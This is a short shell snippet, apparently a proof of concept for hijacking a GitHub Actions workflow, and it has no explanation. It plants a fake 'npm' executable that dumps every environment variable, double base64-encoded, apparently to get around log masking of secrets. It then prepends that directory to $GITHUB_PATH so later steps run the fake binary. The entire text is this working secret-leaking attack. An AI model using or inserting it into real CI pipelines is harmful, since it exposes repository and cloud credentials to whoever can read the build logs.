mkdir evil_path
echo 'env | base64 | base64' > evil_path/npm

chmod +x evil_path/npm

echo "./evil_path" > $GITHUB_PATH


